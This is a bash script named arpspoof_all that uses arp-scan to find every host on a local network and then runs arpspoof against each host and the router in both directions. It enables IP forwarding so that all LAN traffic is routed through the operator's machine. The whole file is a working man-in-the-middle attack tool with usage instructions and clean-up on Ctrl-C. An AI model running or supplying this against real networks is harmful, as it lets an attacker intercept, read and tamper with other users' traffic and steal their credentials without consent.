#!/bin/bash

usageinfo="
Usage: arpspoof_all host_ip

This script will use ARP to determine the hosts assigned local IP
addressed by the router specified by host_ip. It will then attempt to
use the arpspoof(8) utility to force each target on the network to send
all of its local network traffic through your machine instead of the
router.

The main improvement of this script over arpspoof is that it poisons
ALL hosts on the local network, instead of just a single one. It also
poisons the router cache accordingly so you can capture traffic in
both directions. The standard arpspoof utility cannot poison all hosts
on the network in both directions - if used with no target, it will
only poison the target computers and not the network host.

To unspoof all of the spoofed hosts, use ctrl-C to generate a SIGINT.
arpspoof_all will catch the signal and propagate it to any arpspoof
processes it started.
"

if [ "$#" -ne "1" ]; then
    echo "${usageinfo}"
    exit
fi

# Check if the provided host_ip has the general format of an IP address.
if [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    host_ip=$1
    # this sanitized ip will be fed to grep later.
    sanitized_host_ip=$(echo "$1" | sed 's/\./\\\./g')
else
    echo
    echo "ERROR: The provided argument didn't look like an IP address."
    echo
    exit
fi

ipv4_forward=$(sysctl net.ipv4.ip_forward | awk '{print $3}')
ipv6_forward=$(sysctl net.ipv6.conf.all.forwarding | awk '{print $3}')
if [ "$ipv4_forward" -ne "1" ]; then
    printf "Setting "
    sysctl -w net.ipv4.ip_forward=1
fi
if [ "$ipv6_forward" -ne "1" ]; then
    printf "Setting "
    sysctl -w net.ipv6.conf.all.forwarding=1
fi
echo 

# Holds the PIDs of the arpspoof processes.
arpspoof_pids=()

# Holds the local IPs that are being spoofed.
arpspoof_ips=()

# Holds the number of entries in the arrays above.
# Note that this script can add new IPs to arpspoof or
# stop arpspoofing all IPs at once, it cannot stop
# spoofing individual IPs.
arpspoof_ct=0

# Override SIGINT handler
_int() { 
    # Propagate SIGINT to arpspoof children
    i=0
    while [ ${arpspoof_pids[$i]} ] ; do
        kill -INT "${arpspoof_pids[$i]}" 2>/dev/null
        i=$((i+1))
    done

    echo
    echo "Waiting for children to wrap up..."
    i=0
    while [ ${arpspoof_pids[$i]} ] ; do
        wait ${arpspoof_pids[$i]}
        i=$((i+1))
    done

    if [ "$ipv4_forward" -eq "0" ]; then
        printf "Resetting "
        sysctl -w net.ipv4.ip_forward=0
    fi
    if [ "$ipv6_forward" -eq "0" ]; then
        printf "Resetting "
        sysctl -w net.ipv6.conf.all.forwarding=0
    fi
    echo "Done."
    exit
}

trap _int SIGINT

while [ 1 ] ; do

    # First, get the list of local IP addresses corresponding to devices connected
    # to the network, excluding 192.168.0.1 because it is the address of my router.
    ips=$(arp-scan -lq | grep -v "Interface\|Starting\|packets\|Ending\|^$" | awk '{print $1}' | grep -v "^${sanitized_host_ip}$")

    
    for ip in $ips; do

        # Will be turned off if $ip is already being spoofed.
        needs_spoof=1

        # Check first that this local IP is not already being spoofed.
        i=0
        while [ ${arpspoof_ips[$i]} ]; do
            if [ "${arpspoof_ips[$i]}" = "$ip" ]; then
                needs_spoof=0
                break
            fi
            i=$((i+1))
        done

        # If $ip needs spoofing, then...
        if [ "$needs_spoof" -eq "1" ]; then
            arpspoof -t "$ip" -r "$host_ip" 2> /dev/null &
            pid=$!

            echo "Started spoofing of $ip (pid=$pid)"

            # add the PID of the arpspoof process to arpspoof_pids
            arpspoof_pids[$arpspoof_ct]=$pid

            # add the spoofed IP to arpspoof_ips
            arpspoof_ips[$arpspoof_ct]=$ip

            # increment arpspoof_ct
            arpspoof_ct=$((arpspoof_ct+1))
        fi
    done

    # debug printing
#    i=0
#    while [ ${arpspoof_ips[$i]} ]; do
#        echo "Currently spoofing ${arpspoof_ips[$i]}"
#        i=$((i+1))
#    done
#    echo
done














